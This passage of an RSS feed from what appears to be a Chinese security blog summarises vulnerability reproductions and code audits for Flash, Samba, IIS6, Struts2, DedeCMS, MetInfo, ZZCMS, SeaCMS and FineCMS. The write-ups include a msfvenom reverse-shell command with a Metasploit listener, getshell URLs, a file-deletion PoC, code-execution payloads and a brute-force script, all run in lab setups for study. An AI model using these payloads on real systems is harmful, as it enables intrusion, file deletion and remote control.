   开启Hyper-V然后重启就可以使用了。   4. 使用国内的Docker加速器 注册一个阿里云的账号：https://cr.console.aliyun.com/#/accelerator
然后获取专属加速器地址： 在系统右下角托盘图标内右键菜单选择 Settings，打开配置窗口后左侧导航菜单选择 Docker Daemon。编辑窗口内的JSON串，填写加速器地址，如下所示：
{ &amp;#34;registry-mirrors&amp;#34;: [&amp;#34;https://0sdzi917.mirror.aliyuncs.com&amp;#34;] } 5. 用Docker生成漏洞环境并使用  这里我用Samba远程代码执行漏洞(CVE-2017-7494)来做测试。   2017年5月24日Samba发布了4.6.4版本，中间修复了一个严重的远程代码执行漏洞，漏洞编号CVE-2017-7494，漏洞影响了Samba 3.5.0 之后到4.6.4/4.5.10/4.4.14中间的所有版本。
 获取环境   拉取镜像到本地 docker pull medicean/vulapps:s_samba_1</description>
    </item>
    
    <item>
      <title>Flash 0day漏洞(CVE-2018-4878)复现(每日一洞)</title>
      <link>https://getshe11.com/post/recurrence-of-flash-0day-vulnerability-cve-2018-4878/</link>
      <pubDate>Tue, 13 Mar 2018 10:16:27 +0000</pubDate>
      
      <guid>https://getshe11.com/post/recurrence-of-flash-0day-vulnerability-cve-2018-4878/</guid>
      <description>前言 这几天很忙，已经有两天没有更新文章了，最近CVE-2018-4878挺火的，还有群里的人也问这个怎么复现。今天就献丑复现一下，大表哥别喷，虽然我还没研究到这方面的漏洞分析，我会努力的，相信不久我也能写出二进制漏洞分析的文章。
 该漏洞影响 Flash Player 当前最新版本28.0.0.137以及之前的所有版本，而Adobe公司计划在当地时间2月5日紧急发布更新来修复此漏洞。从Adobe公告致谢来看，这个漏洞的野外攻击样本最早是由韩国计算机应急响应小组（KR-CERT）发现的，而KR-CERT也表示，来自朝鲜的黑客组织已经成功利用这个0Day 漏洞发起攻击。
 环境 攻击机： kali 2018 (192.168.59.6) 靶机： Windows 10 x64 (192.168.59.160) Web服务器： Windows 7 X64 (192.168.59.127)
复现过程  我们先在kali生成一个python类型的shellcode msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.59.6 LPORT=6666 -f p ython &amp;gt; /root/shellcode.txt   LHOST就是kali的ip地址，6666端口你可以随便设置，/root/shellcode.txt要生成的文件路径  替换EXP里面的shellcode  使用cve-2018-4878.py生成文件，我这里用的是Sublime Text 3 Ctrl+B运行python，会在本目录下生成两个文件index.html,exploit.swf  然后把这两个文件放到Web服务器里面  在kali的MSF里面设置监听  msf &amp;gt; use exploit/multi/handler msf exploit(handler) &amp;gt; set payload windows/meterpreter/reverse_tcp msf exploit(handler) &amp;gt; set LHOST 192.168.59.6 msf exploit(handler) &amp;gt; set LPORT 6666 msf exploit(handler) &amp;gt; exploit 然后使用靶机的win10 IE访问Web服务器的文件index.</description>
    </item>
    
    <item>
      <title>DedeCMS V5.7 SP2后台Getshell 代码执行漏洞(每日一洞)</title>
      <link>https://getshe11.com/post/dedecms-v5.7-sp2-background-getshell-code-execution-vulnerability/</link>
      <pubDate>Sat, 10 Mar 2018 00:11:57 +0000</pubDate>
      
      <guid>https://getshe11.com/post/dedecms-v5.7-sp2-background-getshell-code-execution-vulnerability/</guid>
      <description>前言 这两天费劲脑力去撩小姐姐，感觉好难啊，还不如审计代码。  环境 Web： phpstudy System： Windows 10 X64 Browser： Firefox Quantum Python version ： 2.7 Tools： PhpStorm 2017.1.1
复现 漏洞利用  首先访问域名 + /dede/tpl.php?action=upload，在这个页面的源代码中获取到token值。  访问以下地址： 域名 + /dede/tpl.php?filename=shell.lib.php&amp;amp;action=savetagfile&amp;amp;content=&amp;lt;?php%20phpinfo();?&amp;gt;&amp;amp;token=刚才的token值  访问shell的地址：  域名 + /include/taglib/shell.lib.php
漏洞分析 代码位置和代码 位置： dedecms\dede\tpl.php 代码：
if(empty($filename)) $filename = &amp;#39;&amp;#39;; $filename = preg_replace(&amp;#34;#[\/\\\\]#&amp;#34;, &amp;#39;&amp;#39;, $filename); 中间省略。。。。。。。。。 else if($action==&amp;#39;savetagfile&amp;#39;) { csrf_check(); if(!preg_match(&amp;#34;#^[a-z0-9_-]{1,}\.lib\.php$#i&amp;#34;, $filename)) { ShowMsg(&amp;#39;文件名不合法，不允许进行操作！&amp;#39;, &amp;#39;-1&amp;#39;); exit(); } require_once(DEDEINC.&amp;#39;/oxwindow.class.php&amp;#39;); $tagname = preg_replace(&amp;#34;#\.lib\.php$#i&amp;#34;, &amp;#34;&amp;#34;, $filename); $content = stripslashes($content); $truefile = DEDEINC.</description>
    </item>
    
    <item>
      <title>MetInfo5.3.19安装过程过滤不严导致Getshell(每日一洞)</title>
      <link>https://getshe11.com/post/metinfo5.3.19-installation-process-is-not-strict-lead-to-getshell/</link>
      <pubDate>Tue, 06 Mar 2018 22:41:35 +0000</pubDate>
      
      <guid>https://getshe11.com/post/metinfo5.3.19-installation-process-is-not-strict-lead-to-getshell/</guid>
      <description>前言 前几天在先知看到的漏洞，就很想写个分析过程了的，因为比赛培训和在审计一个CMS拖到了今天。
环境 Web： phpstudy System： Windows 7 X64 Browser： Firefox Quantum Python version ： 2.7 Tools： PhpStorm 2017.3.3、Seay源代码审计系统
任意文件删除漏洞 复现 POC 前提：需要由对应的删除权限 flienamecsv代表要删除的文件
http://xxx.com/admin/app/batch/csvup.php?fileField=1&amp;amp;flienamecsv=../../../config/install.lock
执行结果 代码位置和漏洞代码 代码位置 \admin\app\batch\csvup.php
漏洞代码 &amp;lt;?php $depth=&amp;#39;../&amp;#39;; require_once $depth.&amp;#39;../login/login_check.php&amp;#39;; setlocale(LC_ALL,array(&amp;#39;zh_CN.gbk&amp;#39;,&amp;#39;zh_CN.gb2312&amp;#39;,&amp;#39;zh_CN.gb18030&amp;#39;)); $codeold=&amp;#39;gbk&amp;#39;; $codenew=&amp;#39;utf-8&amp;#39;; $classflie=explode(&amp;#39;_&amp;#39;,$fileField); $classflie=explode(&amp;#39;-&amp;#39;,$classflie[count($classflie)-1]); $class1=$classflie[0]; $class2=$classflie[1]; $class3=$classflie[2]; $class=$class3?$class3:($class2?$class2:$class1); $classcsv=$db-&amp;gt;get_one(&amp;#34;select * from $met_columnwhere id=$class&amp;#34;); if(!$classcsv){ metsave(&amp;#34;../app/batch/contentup.php?anyid=$anyid&amp;amp;lang=$lang&amp;#34;,$lang_csvnocolumn,$depth); } $table=moduledb($classcsv[&amp;#39;module&amp;#39;]); $file = fopen($flienamecsv,&amp;#39;r&amp;#39;); $fdata=fgetcsv($file); foreach($fdata as $key=&amp;gt;$val){ if(iconv($codeold,$codenew,$val)==$lang_columnhtmlname){$staticnum=$key;} } $numcsv=0; while ($data = fgetcsv($file)){ $staticone=iconv($codeold,$codenew,$data[$staticnum]); if($staticone!=NULL){ $static[$numcsv+1]=$staticone; $static_copy[]=$staticone; } $dataqrray[]=$data; $numcsv++; } fclose($file); @file_unlink($flienamecsv); 分析过程  开始的时候我就在找$fileField和$flienamecsv这两个变量是怎么get过来的，分析了包含include/common.</description>
    </item>
    
    <item>
      <title>ZZCMS8.2任意文件删除至getshell(每日一洞)</title>
      <link>https://getshe11.com/post/zzcms8.2-any-file-deleted-to-getshell/</link>
      <pubDate>Tue, 06 Mar 2018 22:41:35 +0000</pubDate>
      
      <guid>https://getshe11.com/post/zzcms8.2-any-file-deleted-to-getshell/</guid>
      <description>前言 今天就审计一个洞，时间不够用了。明天或者周末看看有空有拿一些难的漏洞来审计复现一下。
环境 Web： Apache+PHP+MySql System： Ubuntu Browser： Firefox Quantum
漏洞详情 任意文件删除 文件位置：/user/licence_save.php
代码：
$title=trim($_POST[&amp;#34;title&amp;#34;]);	$img=trim($_POST[&amp;#34;img&amp;#34;]); if ($_GET[&amp;#34;action&amp;#34;]==&amp;#34;add&amp;#34;){ query(&amp;#34;Insert into zzcms_licence(title,img,editor,sendtime) values(&amp;#39;$title&amp;#39;,&amp;#39;$img&amp;#39;,&amp;#39;$username&amp;#39;,&amp;#39;&amp;#34;.date(&amp;#39;Y-m-d H:i:s&amp;#39;).&amp;#34;&amp;#39;)&amp;#34;) ; }elseif ($_GET[&amp;#34;action&amp;#34;]==&amp;#34;modify&amp;#34;){ $oldimg=trim($_POST[&amp;#34;oldimg&amp;#34;]); $id=$_POST[&amp;#34;id&amp;#34;]; if ($id==&amp;#34;&amp;#34; || is_numeric($id)==false){ $FoundErr=1; $ErrMsg=&amp;#34;&amp;lt;li&amp;gt;&amp;#34;. $f_array[0].&amp;#34;&amp;lt;/li&amp;gt;&amp;#34;; WriteErrMsg($ErrMsg); }else{ query(&amp;#34;update zzcms_licence set title=&amp;#39;$title&amp;#39;,img=&amp;#39;$img&amp;#39;,sendtime=&amp;#39;&amp;#34;.date(&amp;#39;Y-m-d H:i:s&amp;#39;).&amp;#34;&amp;#39;,passed=0 where id=&amp;#39;$id&amp;#39;&amp;#34;); if ($oldimg&amp;lt;&amp;gt;$img &amp;amp;&amp;amp; $oldimg&amp;lt;&amp;gt;&amp;#34;/image/nopic.gif&amp;#34;){ $f=&amp;#34;../&amp;#34;.$oldimg; if (file_exists($f)){ unlink($f); } $fs=&amp;#34;../&amp;#34;.str_replace(&amp;#34;.&amp;#34;,&amp;#34;_small.&amp;#34;,$oldimg).&amp;#34;&amp;#34;; if (file_exists($fs)){ unlink($fs);	} }	} }  我们可以看到如果从$_GET传值过来如果是modify，那么就执行下面的内容。 $oldimg=trim($_POST[&amp;quot;oldimg&amp;quot;]);把$_POST过来的oldimg用trim去点两边的空格之后赋值给$oldimg 接下来这些不用理会，直到if ($oldimg&amp;lt;&amp;gt;$img &amp;amp;&amp;amp; $oldimg&amp;lt;&amp;gt;&amp;quot;/image/nopic.gif&amp;quot;)这句判断，$img是上面$_POST过来的，填其他值就不等于了，然后我们的文件名也不会等于/image/nopic.gif $f=&amp;quot;../&amp;quot;.$oldimg;跳到主目录然后接上我们的要传过来的文件路径和文件名 if (file_exists($f)){unlink($f);}这句file_exists判断文件是否存在，存在就用unlink删除文件。 中间没有做任何的过滤。。。  构造POC 我们要把这些$_POST和$_GET的值都加上，要不然PHP会报错不执行下去。</description>
    </item>
    
    <item>
      <title>ZZCMS8.2任意用户密码修改漏洞代码分析(每日一洞)</title>
      <link>https://getshe11.com/post/zzcms-any-user-password-changes-loopholes-code-points/</link>
      <pubDate>Tue, 06 Mar 2018 00:03:07 +0000</pubDate>
      
      <guid>https://getshe11.com/post/zzcms-any-user-password-changes-loopholes-code-points/</guid>
      <description>前言 这几天感冒很难受，再加上比赛的培训，估计后面会两天一篇。 这个小型CMS前段时间我也挖到了很多洞，这次就找seebug发的一篇来做审计。
环境 Web： phpstudy System： Windows 10 X64 Browser： Firefox Quantum Python version ： 2.7
漏洞详情 代码位置和代码  位置 \one\getpassword.php 代码  &amp;lt;?php if(!isset($_SESSION)){session_start();} include(&amp;#34;../inc/conn.php&amp;#34;); include(&amp;#34;../inc/top2.php&amp;#34;); include(&amp;#34;../inc/bottom.php&amp;#34;); $action = isset($_POST[&amp;#39;action&amp;#39;])?$_POST[&amp;#39;action&amp;#39;]:&amp;#34;&amp;#34;; $file=&amp;#34;../template/&amp;#34;.$siteskin.&amp;#34;/getpassword.htm&amp;#34;; if (file_exists($file)==false){ WriteErrMsg($file.&amp;#39;模板文件不存在&amp;#39;); exit; } $fso = fopen($file,&amp;#39;r&amp;#39;); $strout = fread($fso,filesize($file)); $stepall=strbetween($strout,&amp;#34;{step1}&amp;#34;,&amp;#34;{/step4}&amp;#34;); $step1=strbetween($strout,&amp;#34;{step1}&amp;#34;,&amp;#34;{/step1}&amp;#34;); $step2=strbetween($strout,&amp;#34;{step2}&amp;#34;,&amp;#34;{/step2}&amp;#34;); $step3=strbetween($strout,&amp;#34;{step3}&amp;#34;,&amp;#34;{/step3}&amp;#34;); $step4=strbetween($strout,&amp;#34;{step4}&amp;#34;,&amp;#34;{/step4}&amp;#34;); if ($action==&amp;#34;&amp;#34;){ $strout=str_replace(&amp;#34;{step1}&amp;#34;,&amp;#34;&amp;#34;,$strout) ; $strout=str_replace(&amp;#34;{/step1}&amp;#34;,&amp;#34;&amp;#34;,$strout) ; $strout=str_replace(&amp;#34;{step2}&amp;#34;.$step2.&amp;#34;{/step2}&amp;#34;,&amp;#34;&amp;#34;,$strout) ; $strout=str_replace(&amp;#34;{step3}&amp;#34;.$step3.&amp;#34;{/step3}&amp;#34;,&amp;#34;&amp;#34;,$strout) ; $strout=str_replace(&amp;#34;{step4}&amp;#34;.$step4.&amp;#34;{/step4}&amp;#34;,&amp;#34;&amp;#34;,$strout) ; } if ($action==&amp;#34;step1&amp;#34;){ $username = isset($_POST[&amp;#39;username&amp;#39;])?$_POST[&amp;#39;username&amp;#39;]:&amp;#34;&amp;#34;; $_SESSION[&amp;#39;username&amp;#39;]=$username; checkyzm($_POST[&amp;#34;yzm&amp;#34;]); $rs=query(&amp;#34;select mobile,email from zzcms_user where username=&amp;#39;&amp;#34; .</description>
    </item>
    
    <item>
      <title>SeaCMS v6.54和v6.55前台Getshell 代码执行漏洞(每日一洞)</title>
      <link>https://getshe11.com/post/seacms-v6.54-and-v6.55-front-desk-getshell-code-execution-vulnerability-one-hole-a-day/</link>
      <pubDate>Sat, 03 Mar 2018 23:32:41 +0000</pubDate>
      
      <guid>https://getshe11.com/post/seacms-v6.54-and-v6.55-front-desk-getshell-code-execution-vulnerability-one-hole-a-day/</guid>
      <description>前言 这两个版本修复上次的v6.45版本中的order传值后执行的漏洞，但是在新的版本里面利用parseIf函数的功能还可以继续利用。 因为上一篇也已经过了一遍search.php的执行过程，这篇就不再重复讲解了。 链接：http://getpass.cn/2018/03/02/SeaCMS%20v6.45%E5%89%8D%E5%8F%B0Getshell%20%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(%E6%AF%8F%E6%97%A5%E4%B8%80%E6%B4%9E)/
环境 Web： phpstudy System： Windows 10 X64 Browser： Firefox Quantum Python version ： 2.7
v6.54漏洞详情 漏洞代码执行 Payload get:http://seacms.test/search.php POST: searchtype=5&amp;amp;searchword={if{searchpage:year}&amp;amp;year=:e{searchpage:area}}&amp;amp;area=v{searchpage:letter}&amp;amp;letter=al{searchpage:lang}&amp;amp;yuyan=(join{searchpage:jq}&amp;amp;jq=($_P{searchpage:ver}&amp;amp;ver=OST[9]))&amp;amp;9[]=ph&amp;amp;9[]=pinfo();
执行结果 分析过程  这个版本只是把order的变量做了限制，但是声明为global变量的不止order,为什么不用其他而用order，在上一篇已经讲过了。  $order = RemoveXSS(stripslashes($order)); $order = addslashes(cn_substr($order,20));  我看了这次构造的POC，我也是佩服这位表哥，因为分析这些代码需要大量的时间。这次通过echoSearchPage函数里面的拼接功能，我们可以在没转换之前输出一下$content的内容，这里我推荐直接用highlight_string($content)直接输出，不用右键查看源代码了。 大家可以先在searchword替换前输出$content，可以看到还没有开始替换。 那我们在替换后，输出$content，可以看到已经拼接成型了。    156行 $content = str_replace(&amp;#34;{seacms:searchword}&amp;#34;,$searchword,$content); 。。。。。。。。。。 if(intval($searchtype)==5) { $tname = !empty($tid)?getTypeNameOnCache($tid):&amp;#39;全部&amp;#39;; $jq = !empty($jq)?$jq:&amp;#39;全部&amp;#39;; $area = !empty($area)?$area:&amp;#39;全部&amp;#39;; $year = !empty($year)?$year:&amp;#39;全部&amp;#39;; $yuyan = !empty($yuyan)?$yuyan:&amp;#39;全部&amp;#39;; $letter = !empty($letter)?$letter:&amp;#39;全部&amp;#39;; $state = !empty($state)?$state:&amp;#39;全部&amp;#39;; $ver = !</description>
    </item>
    
    <item>
      <title>SeaCMS v6.45前台Getshell 代码执行漏洞(每日一洞)</title>
      <link>https://getshe11.com/post/seacms-v6.45-front-desk-getshell-code-execution-vulnerability-one-hole-a-day/</link>
      <pubDate>Fri, 02 Mar 2018 19:28:36 +0000</pubDate>
      
      <guid>https://getshe11.com/post/seacms-v6.45-front-desk-getshell-code-execution-vulnerability-one-hole-a-day/</guid>
      <description>前言 昨晚审计到了三点，今天还要整理宿舍就没有写文章。这个CMS没有用框架，漏洞的执行过程我看了很久才看完，下面就写漏洞执行过程和POC构造还有用Python编写批量Getshell脚本。
环境 Web： phpstudy System： Windows 10 X64 Browser： Firefox Quantum Python version ： 2.7
漏洞代码执行过程分析 先看一下这个代码是一个怎么执行的吧，我画了一个流程图，有点简陋，不过如果真的要深入了解一定要亲自去看一遍代码才行。 漏洞详情 漏洞代码执行 Payload代码 http://seacms.test/search.php POST:searchtype=5&amp;amp;order=}{end if} {if:1)phpinfo();if(1}{end if}
执行结果 分析过程  漏洞的触发点是在search.php 中的echoSearchPage()函数可以触发漏洞。常规的分析都是先找GET、POST的位置，在这个文件里面没有这些变量，原来是在./include/common.php里面。  if(PHP_VERSION &amp;lt; &amp;#39;4.1.0&amp;#39;) { $_GET = &amp;amp;$HTTP_GET_VARS; $_POST = &amp;amp;$HTTP_POST_VARS; $_COOKIE = &amp;amp;$HTTP_COOKIE_VARS; $_SERVER = &amp;amp;$HTTP_SERVER_VARS; $_ENV = &amp;amp;$HTTP_ENV_VARS; $_FILES = &amp;amp;$HTTP_POST_FILES; } ...... foreach(Array(&amp;#39;_GET&amp;#39;,&amp;#39;_POST&amp;#39;,&amp;#39;_COOKIE&amp;#39;) as $_request) { foreach($$_request as $_k =&amp;gt; $_v) ${$_k} = _RunMagicQuotes($_v); } 所以Payload用GET还是POST都是可以的。</description>
    </item>
    
    <item>
      <title>通杀FineCMS5.0.8及版本以下getshell的漏洞(每天一洞)</title>
      <link>https://getshe11.com/post/kill-the-vulnerabilities-of-getshell-v.-finecms-5.0.8-and-below-1-hole-per-day/</link>
      <pubDate>Wed, 28 Feb 2018 22:23:23 +0000</pubDate>
      
      <guid>https://getshe11.com/post/kill-the-vulnerabilities-of-getshell-v.-finecms-5.0.8-and-below-1-hole-per-day/</guid>
      <description>前言 这几天都挺忙的，刚开学也在做比赛的培训，每天一洞这个事情一定得坚持下去，跟着上次的finecms，在漏洞时代又找了一个漏洞来审计。但是他改了函数里面的传参，我也弄了一阵子才搞明白这个传参原来需要加密过的参数，还有就是这个远程下载再上传，有个小问题，那篇文章没有说明，等下再系统说下。
漏洞详情 代码位置和代码  位置 \finecms\dayrui\controllers\member\Api.php 代码  public function down_file() { $p = array(); $url = explode(&amp;#39;&amp;amp;&amp;#39;, $this-&amp;gt;input-&amp;gt;post(&amp;#39;url&amp;#39;)); //经过&amp;amp; 分割  foreach ($url as $t) { $item = explode(&amp;#39;=&amp;#39;, $t); $p[$item[0]] = $item[1]; } //经过 = 分割  !$this-&amp;gt;uid &amp;amp;&amp;amp; exit(dr_json(0, fc_lang(&amp;#39;游客不允许上传附件&amp;#39;))); //对$p[&amp;#39;code&amp;#39;] 进行解码  list($size, $ext) = explode(&amp;#39;|&amp;#39;, dr_authcode($p[&amp;#39;code&amp;#39;], &amp;#39;DECODE&amp;#39;)); //得到尺寸和后缀  $path = SYS_UPLOAD_PATH.&amp;#39;/&amp;#39;.date(&amp;#39;Ym&amp;#39;, SYS_TIME).&amp;#39;/&amp;#39;; !is_dir($path) &amp;amp;&amp;amp; dr_mkdirs($path); $furl = $this-&amp;gt;input-&amp;gt;post(&amp;#39;file&amp;#39;); $file = dr_catcher_data($furl); //dr_catcher_data 是读取远程文件  !</description>
    </item>
    
    <item>
      <title>DVWA之Brute Force更新</title>
      <link>https://getshe11.com/post/dvwa-brute-force-update-/</link>
      <pubDate>Wed, 28 Feb 2018 00:18:00 +0000</pubDate>
      
      <guid>https://getshe11.com/post/dvwa-brute-force-update-/</guid>
      <description>前言 今天又练习了一遍DVWA，发现了一些小问题。
问题一 在原文http://www.freebuf.com/articles/web/116437.html 中的python代码我重新运行了一遍，发现有错误。提示没有这个&#39;input&#39;的Type,所以我做了下修改就能正常运行了。 原先的user_token = soup.form.input.input.input.input[&amp;quot;value&amp;quot;] 改成了user_token = soup.find_all(&amp;quot;input&amp;quot;)[3].get(&amp;quot;value&amp;quot;)# get the user_token 代码如下：
from bs4 import BeautifulSoup import urllib2 header={ &amp;#39;Host&amp;#39;: &amp;#39;192.168.59.127&amp;#39;, &amp;#39;Cache-Control&amp;#39;: &amp;#39;max-age=0&amp;#39;, &amp;#39;If-None-Match&amp;#39;: &amp;#34;307-52156c6a290c0&amp;#34;, &amp;#39;If-Modified-Since&amp;#39;: &amp;#39;Mon, 05 Oct 2015 07:51:07 GMT&amp;#39;, &amp;#39;User-Agent&amp;#39;: &amp;#39;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36&amp;#39;, &amp;#39;Accept&amp;#39;: &amp;#39;*/*&amp;#39;, &amp;#39;Referer&amp;#39;: &amp;#39;http://192.168.59.127/dvwa/vulnerabilities/brute/index.php&amp;#39;, &amp;#39;Accept-Encoding&amp;#39;: &amp;#39;gzip, deflate, sdch&amp;#39;, &amp;#39;Accept-Language&amp;#39;: &amp;#39;zh-CN,zh;q=0.8&amp;#39;, &amp;#39;Cookie&amp;#39;: &amp;#39;security=high; PHPSESSID=4ac4tdpdn25suknveha54ml3i2&amp;#39;} requrl = &amp;#34;http://192.168.59.127/dvwa/vulnerabilities/brute/&amp;#34; def get_token(requrl,header): req = urllib2.Request(url=requrl, headers=header) response = urllib2.</description>
    </item>
    
    <item>
      <title>FineCMS最新版5.0.8两处getshell(每天一洞)</title>
      <link>https://getshe11.com/post/the-latest-version-of-finecms-5.0.8-getshell-daily-two-holes/</link>
      <pubDate>Tue, 30 Jan 2018 00:06:41 +0000</pubDate>
      
      <guid>https://getshe11.com/post/the-latest-version-of-finecms-5.0.8-getshell-daily-two-holes/</guid>
      <description>前言 要专心学习代码审计了，看看能不能坚持每天去分析一个漏洞，我会去按照大神们分析的代码去读懂代码逻辑然后再写上自己的理解放在我的博客上面。在文章的末尾我会贴上文章的链接，尊重原作者的版权！
第一处漏洞分析 漏洞文件位置和代码 代码位置：\finecms\dayrui\controllers\Api.php
核心代码：
public function data2() { $data = array(); // 来路认证  if (defined(&amp;#39;SYS_REFERER&amp;#39;) &amp;amp;&amp;amp; strlen(SYS_REFERER)) { $http = $_SERVER[&amp;#39;HTTP_REFERER&amp;#39;] ? $_SERVER[&amp;#39;HTTP_REFERER&amp;#39;] : $_GET[&amp;#39;http_referer&amp;#39;]; if (empty($http)) { $data = array(&amp;#39;msg&amp;#39; =&amp;gt; &amp;#39;来路认证失败（NULL）&amp;#39;, &amp;#39;code&amp;#39; =&amp;gt; 0); } elseif (strpos($http, SYS_REFERER) === FALSE) { $data = array(&amp;#39;msg&amp;#39; =&amp;gt; &amp;#39;来路认证失败（非法请求）&amp;#39;, &amp;#39;code&amp;#39; =&amp;gt; 0); } } //如果data为空就继续  if (!$data) { // 安全码认证  //从get接收auth的参数  $auth = $this-&amp;gt;input-&amp;gt;get(&amp;#39;auth&amp;#39;); //SYS_KEY的值为24b16fede9a67c9251d3e7c7161c83ac，如果auth不等于md5加密后的SYS_KEY就执行  if ($auth !</description>
    </item>
    
    <item>
      <title>IIS6.0远程命令执行漏洞(CVE-2017-7269)</title>
      <link>https://getshe11.com/post/iis6.0-remote-command-execution-vulnerability-cve-2017-7269/</link>
      <pubDate>Tue, 16 Jan 2018 19:10:45 +0000</pubDate>
      
      <guid>https://getshe11.com/post/iis6.0-remote-command-execution-vulnerability-cve-2017-7269/</guid>
      <description>漏洞信息 漏洞编号：CVE-2017-7269 发现人员：Zhiniang Peng和Chen Wu（华南理工大学信息安全实验室,计算机科学与工程学院） 漏洞简述：开启WebDAV服务的IIS 6.0被爆存在缓存区溢出漏洞导致远程代码执行，目前针对 Windows Server 2003 R2 可以稳定利用，该漏洞最早在2016年7,8月份开始在野外被利用。 漏洞类型：缓冲区溢出 漏洞等级：高危 影响产品：Microsoft Windows Server 2003 R2 开启WebDAV服务的IIS6.0（目前已验证,其他版本尚未验证） 触发函数：ScStoragePathFromUrl函数 附加信息：ScStoragePathFromUrl函数被调用了两次 漏洞细节：在Windows Server 2003的IIS6.0的WebDAV服务的ScStoragePathFromUrl函数存在缓存区溢出漏洞，攻击者通过一个以“If: &amp;lt;Http://”开始的较长header头的PROPFIND请求执行任意代码。
利用条件  iis6.0 开启WebDav功能（具体为PROPFIND方法，成功则返回207或者200） windows server 2003 R2  POC #------------Our payload set up a ROP chain by using the overflow 3 times. It will launch a calc.exe which shows the bug is really dangerous. #written by Zhiniang Peng and Chen Wu. Information Security Lab &amp;amp; School of Computer Science &amp;amp; Engineering, South China University of Technology Guangzhou, China #-----------Email: edwardz@foxmail.</description>
    </item>
    
    <item>
      <title>Struts2漏洞POC汇总</title>
      <link>https://getshe11.com/post/struts2-vulnerability-poc-summary/</link>
      <pubDate>Wed, 30 Aug 2017 07:12:56 +0000</pubDate>
      
      <guid>https://getshe11.com/post/struts2-vulnerability-poc-summary/</guid>
      <description>&lt;p&gt;免责申明：文章中的工具以及POC等仅供个人测试研究，请在下载后24小时内删除，不得用于商业或非法用途，否则后果自负，如有使用于黑产者，与本文无关
Struts2框架漏洞不断，鉴于struts2使用之广泛，本文汇总Struts2系列漏洞的Poc，给网络管理员或者站长提供查询便利，以便更好的检测自身网站存在的漏洞，也可以让安全从业者更好的了解此漏洞。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>Struts2 S2-045 Jakarta插件远程代码执行漏洞利用与修补</title>
      <link>https://getshe11.com/post/struts2-s2-045-jakarta-plug-in-remote-code-execution-vulnerability-exploitation-and-repair/</link>
      <pubDate>Tue, 29 Aug 2017 22:53:58 +0000</pubDate>
      
      <guid>https://getshe11.com/post/struts2-s2-045-jakarta-plug-in-remote-code-execution-vulnerability-exploitation-and-repair/</guid>
      <description>&lt;p&gt;近日，安恒信息安全研究院WEBIN实验室高级安全研究员nike.zheng发现著名J2EE框架-Struts2存在远程代码执行的严重漏洞。&lt;/p&gt;</description>
    </item>
    
  </channel>
</rss>
